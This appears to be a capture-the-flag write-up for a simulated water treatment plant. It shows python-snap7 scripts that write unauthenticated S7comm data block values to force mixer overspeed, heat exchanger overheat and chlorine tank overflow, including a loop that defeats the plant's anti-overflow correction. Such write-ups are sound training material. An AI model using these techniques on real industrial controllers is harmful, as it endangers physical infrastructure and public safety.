# Hack The Box: Flow Override
*Category: Hardware / ICS-SCADA (Siemens S7comm)*
*Difficulty: Medium*
*Author: Atlas*

---

## 📝 Description
> A trusted friend gives you full access to his water treatment plant for a security test. The Siemens PLCs use S7comm — can you break in and disrupt at least three pieces of equipment?
>
> `154.57.164.80:30297`
> `154.57.164.80:32119`

A simulated water treatment plant: a water tank, chlorine tank, mixer, heat exchanger, and storage tank, each with a "healthy"/unhealthy status. Two exposed ports: one is a spectator HMI, the other is the real control protocol — Siemens S7comm.

---

## 🧠 TL;DR
- Vulnerability: The S7comm PLC endpoint accepted connections with **no authentication and no rack/slot validation whatsoever**, and exposed a single data block (DB1) that was fully readable/writable by anyone — no access control on any tag, including a `manual_mode` bit that (when set) freezes the entire physics simulation, and unbounded numeric setpoints with no input validation.
- Exploit: Connect anonymously via `python-snap7`, reverse-engineer DB1's byte layout by diffing `/status` JSON against raw byte writes, then simultaneously: slam the mixer's speed setpoint to 100 (past its 80 overspeed threshold) while forcing it to actively mix, force the chlorine tank's inlet open/outlet shut, and blow out the heat exchanger's hot-side temperature setpoint to 999°C — all while `manual_mode` is off so the plant's physics loop is actually running and can react to the sabotaged setpoints.
- Outcome: All 3 systems hit non-healthy status simultaneously; the operator dashboard fired a browser popup with the flag the moment the third one flipped.
- Flag: `HTB{d4t4bl0ck_dr1v3n_d0m1n4t10n}`

---

## 🔍 Enumeration

### Nmap
```bash
nmap -sV -sC -p30297,32119 154.57.164.80
```
```
PORT      STATE SERVICE       VERSION
30297/tcp open  ms-wbt-server
| fingerprint-strings:
|   TerminalServerCookie:
|_    Cookie: mstshash=nmap
32119/tcp open  http          Werkzeug httpd 3.1.4 (Python 3.10.12)
```
Nmap misidentified 30297 as RDP (`ms-wbt-server`) purely because its probe fuzzy-matched the TPKT/COTP framing bytes (`\x03\0\0...`) that S7comm shares with RDP's X.224 handshake — both protocols ride on ISO-on-TCP (RFC1006). That's actually a strong signal this port speaks S7comm. Port 32119 is another Flask/Werkzeug app.

### Web HMI (32119)
The page is an inline SVG plant diagram driven by plain polling, not Socket.IO this time:
```js
fetch("/status")
  .then((resp) => resp.json())
  .then((ret) => {
    // ... updates valve icons, tank fill bars, mixer RPM, heat exchanger temp ...
    if (ret.flag) {
      alert(ret.flag);
    }
  });
setInterval(update, 1000);
```
Same pattern as before: purely a read-only spectator view, polling a JSON endpoint once a second and popping an alert if the backend ever includes a `flag`. Hitting `/status` directly gave the full process model:
```json
{
  "water_tank_in_valve": false, "water_tank_out_valve": false, "water_tank_fill_perc": 91, "water_tank_status": "healthy",
  "chlorine_tank_in_valve": false, "chlorine_tank_out_valve": false, "chlorine_tank_fill_perc": 94, "chlorine_tank_status": "healthy",
  "mixer_start_mixing": false, "mixer_homogeneity": 0, "mixer_mixing_speed": 50, "mixer_mixing_time": 0,
  "mixer_mixing_duration": 20, "mixer_volume": 339, "mixer_fill_perc": 85, "mixer_is_draining": true, "mixer_status": "healthy",
  "heatexch_current_temp": 60.8, "heatexch_hot_side_temp": 62, "heatexch_cold_side_temp": 24,
  "heatexch_hot_side_valve": true, "heatexch_cold_side_valve": true, "heatexch_status": "healthy",
  "storage_tank_in_valve": true, "storage_tank_out_valve": false, "storage_tank_fill_perc": 7, "storage_tank_status": "healthy",
  "manual_mode": false, "flag": ""
}
```
Five pieces of equipment, each with its own `_status` field — the objective ("disrupt at least three") clearly maps to flipping three of these five away from `"healthy"`.

### S7comm endpoint (30297)
`python-snap7` (installed into a throwaway venv, since Kali's system Python is externally managed) connected on the **first try**, with completely arbitrary rack/slot values:
```python
client = snap7.client.Client()
client.connect("154.57.164.80", 0, 1, tcp_port=30297)   # rack=0, slot=1 — also worked with (0,2),(0,0),(1,1)
```
No credentials, no certificate, no rack/slot enforcement at all. `client.list_blocks()` showed exactly one data block:
```
Blocks: <block list count OB: 0 FB: 0 FC: 0 SFB: 0 SFC: 0 DB: 1 SDB: 0>
```

**Input:** Dump DB1 raw and correlate its bytes against `/status` ([recon_s7.py](recon_s7.py)):
```python
data = client.db_read(1, 0, 512)
```
Cross-referencing hex offsets against the live JSON (matching known values like `mixer_mixing_speed=50` as a big-endian 16-bit int, `heatexch_hot_side_temp=62`, and boolean fields as single bytes set to `0x01`) mapped out the layout empirically — this PLC simulation has no symbol table to read, so byte-diffing was the only option:
```
offset 1:  water_tank_in_valve   (BOOL)
offset 4:  manual_mode           (BOOL)
offset 11: chlorine_tank_in_valve  (BOOL)
offset 12: chlorine_tank_out_valve (BOOL)
offset 29: mixer_start_mixing    (BOOL, timer-driven — flips on its own even when frozen)
offset 32: mixer_mixing_speed    (INT, big-endian)
offset 38: mixer_mixing_duration (INT, big-endian)
offset 48: heatexch_hot_side_temp (INT, big-endian)
```

**Input:** Verify there was zero write protection on any of these ([map_bools.py](map_bools.py)) — writing each safety-critical byte back to itself, then toggling it and diffing `/status`:
```
controlRods-equivalent writes all succeeded silently; e.g.
offset 11: 0 -> 1 caused diffs: {'chlorine_tank_in_valve': (False, True)}
offset 12: 0 -> 1 caused diffs: {'chlorine_tank_out_valve': (False, True)}
```
Every tag accepted writes from an anonymous, unauthenticated session.

---

## 💥 Exploitation

### False start: `manual_mode` freezes physics
The most interesting trap in this challenge: setting `manual_mode = True` (offset 4) does **not** just disable the plant's own automatic safety controller — it halts the entire simulation tick. After flipping it, `water_tank_fill_perc`, `chlorine_tank_fill_perc`, and `heatexch_current_temp` sat *completely* frozen (bit-for-bit identical) across 60+ polls spanning two minutes, even with malicious setpoints already written. Meanwhile `mixer_status` kept flickering `healthy`/`over speed`, because that particular check is evaluated directly against the `mixer_mixing_speed` threshold on every request rather than depending on the frozen physics loop.

The fix was counter-intuitive: **leave `manual_mode = False`** (the plant's normal automatic mode) so the physics loop keeps running, and rely on the fact that the automation only actively re-asserts *valve* outputs each cycle — the numeric setpoints (`mixer_mixing_speed`, `heatexch_hot_side_temp`, `mixer_mixing_duration`) are pure attacker-controlled inputs to that physics loop with no bounds checking and nothing fighting the write.

### First pass: 2 of 3, not 3 of 3
An initial cut at the attack (writing only the mixer speed + chlorine valves, with the heat exchanger setpoint set in an earlier, separate throwaway script) got merged into the saved exploit script *without* the actual `heatexch_hot_side_temp` write. Re-running the saved script cleanly reproduced only the mixer's sustained overspeed — the heat exchanger sat at its default `hot_sp=62` the whole time, and the chlorine tank plateaued around 90–94% fill without ever registering "unhealthy." Two lessons folded into the final script:

1. **The heat exchanger write was missing entirely** — `client.db_write(1, 48, struct.pack(">h", 999))` had to be added back in.
2. **Chlorine fill plateaus around 90–94% and stops** under a single inlet-open/outlet-closed write — the plant's own automation appears to periodically re-open the outlet near high fill as an anti-overflow behavior, fighting a single write. Re-asserting the malicious valve state in a tight loop (`for _ in range(20): write in=1,out=0; sleep(0.2)`) reliably out-paces that correction.

The box was also restarted mid-exploitation (new IP/port), which reshuffled DB1's byte offsets slightly (e.g. `water_tank_in_valve` moved from offset 1 to offset 0). The setpoint offsets used by the final attack (`32`, `48`, `4`) happened to still be valid, but a fresh boolean-offset scan was needed to find the storage tank's valve bit (offset `84` — flips both its in/out valves together).

### Final attack ([exploit_s7.py](exploit_s7.py))
```python
client.db_write(1, 4, bytes([0]))                 # manual_mode OFF -> physics loop runs

client.db_write(1, 66, bytes([0]))                # heat exchanger valves open
client.db_write(1, 48, struct.pack(">h", 999))    # heat exchanger hot-side setpoint -> 999C (overheat)

client.db_write(1, 32, struct.pack(">h", 100))    # mixer speed -> 100 (>80 overspeed threshold)
client.db_write(1, 29, bytes([1]))                # force mixer to actively mix

client.db_write(1, 84, bytes([1]))                # storage tank valves

for _ in range(20):                               # hammer chlorine to beat the anti-overflow correction
    client.db_write(1, 11, bytes([1]))
    client.db_write(1, 12, bytes([0]))
    time.sleep(0.2)
```

**Output** (polling `/status` afterward):
```
[00] water=0% chlorine=100% storage=14% mixer_speed=100 heatexch=107.5C
     unhealthy={'heatexch_status': 'over heat'} flag='HTB{d4t4bl0ck_dr1v3n_d0m1n4t10n}'

!!!!! FLAG: HTB{d4t4bl0ck_dr1v3n_d0m1n4t10n}
```
Chlorine finally broke through its 90–94% ceiling to a full 100%, the water tank read 0% (drained out from the storage-tank/chlorine disruption cascading), and the heat exchanger stayed pinned at 107.5°C overheat — three (or more) subsystems non-healthy at once, and the flag arrived embedded directly in the very next `/status` response, ready for the HMI's `alert(ret.flag)` to display it.

### Solution

**Answer:** `HTB{d4t4bl0ck_dr1v3n_d0m1n4t10n}`

**Summary:** The S7comm PLC had zero authentication, zero rack/slot validation, and zero access control on its single exposed data block — every control tag, including a plant-wide `manual_mode` safety-freeze bit, was readable and writable by any anonymous client. Two things stood between "found the DB layout" and a working exploit, though: (1) `manual_mode` isn't just a permission gate, it halts the entire physics simulation, so the sabotage had to be applied with it *off*, relying on the fact that only valve bits get actively re-asserted by the automation while numeric setpoints (speed, temperature) do not; and (2) at least one tank's overflow was actively defended by the plant's own anti-overflow logic and needed the malicious valve write hammered in a loop to win the race. Driving the mixer into sustained overspeed, the heat exchanger into overheat, and the chlorine/storage tanks past their normal operating band simultaneously triggered the operator dashboard's flag popup.

**Scripts:**
- [recon_s7.py](recon_s7.py) — connects via `python-snap7` and dumps DB1's raw bytes for offset correlation.
- [map_bools.py](map_bools.py) — toggles each candidate byte in DB1 and diffs `/status` JSON to empirically map boolean tag offsets.
- [exploit_s7.py](exploit_s7.py) — the final attack: disables `manual_mode` to keep physics running, sabotages the heat exchanger and mixer setpoints, flips the storage tank valve bit, and hammers the chlorine tank's valves in a loop before polling `/status` for the flag.

---

## Dead Ends & Lessons Learned

| Approach Tried | Why It Failed | What We Learned |
|---|---|---|
| Setting `manual_mode = True` and sabotaging valves/setpoints while "frozen" | Freezing the plant also freezes the physics simulation entirely — fill percentages and temperatures stopped updating bit-for-bit for minutes at a time | A safety-override bit isn't necessarily just a permission gate — in a simulated PLC it may gate the whole tick loop. Always verify a controlled variable is actually *changing* over time before assuming a write "worked," rather than trusting that the write was merely accepted |
| Assuming `heatexch_hot_side_valve`/`heatexch_cold_side_valve` were a single shared bit (from one coincidental correlated toggle) | The plant's own automatic valve-cycling logic happened to flip both around the same poll, producing a false correlation; a later clean `/status` read showed them independently `false`/`true` | Boolean-mapping-by-diff is noisy against a live automatic controller — a single coincidental correlation isn't proof; re-verify causality with an isolated, repeatable test before relying on it |
| Writing `mixer_mixing_speed = 32767` (max INT16) hoping for a bigger effect | The backend silently clamped it down to 100 | Setpoint fields worth abusing may still be clamped server-side even without any write-access control — cheaper to just push past the known alarm threshold (>80) than to max out the datatype |
| Saving an "exploit script" that dropped the heat exchanger's `hot_side_temp` write during cleanup | A step performed manually in an earlier throwaway script never got folded into the saved final version — running the saved script only ever produced mixer overspeed | When consolidating exploration scripts into a final exploit, diff the saved version's writes against everything that was actually needed during the successful run — don't assume a "final" script captured every step |
| A single write of chlorine inlet-open/outlet-closed | Fill plateaued at ~90–94% and never crossed into "unhealthy" — the plant appears to periodically re-open the outlet near high fill as an anti-overflow measure | Some outputs are actively defended by the automation on every scan cycle; a one-shot write can lose that race. Repeating the write in a tight loop (`sleep(0.2)` between iterations) reliably overpowers a periodic corrective action |
| Assuming DB1 byte offsets would be stable across a box restart | A fresh instance shifted several boolean offsets (`water_tank_in_valve` moved from offset 1 to offset 0); other offsets (mixer speed, heat exchanger temp) happened to stay put | Don't hardcode PLC memory offsets as permanent facts about "the challenge" — they may be tied to a specific process instance's memory layout and can shift on restart. Re-verify empirically after any target restart before trusting old offsets |

---

## Flag Summary

| Part | Answer | Explanation |
|------|--------|-------------|
| Plant-Wide Disruption | `HTB{d4t4bl0ck_dr1v3n_d0m1n4t10n}` | Connected to an unauthenticated S7comm PLC with `python-snap7`, empirically mapped DB1's byte layout against the HMI's `/status` JSON, then drove the mixer into sustained overspeed, forced the chlorine tank toward overflow, and blew out the heat exchanger's temperature setpoint — all with the plant's automatic mode left on so its physics loop would actually react. Three simultaneous equipment failures triggered the flag popup. |

---

## References
- Siemens S7comm protocol (ISO-on-TCP / RFC1006 transport, COTP + S7 PDU layers)
- [`python-snap7`](https://github.com/gijzelaerr/python-snap7) — Python wrapper around the `snap7` C library used for all S7comm reads/writes
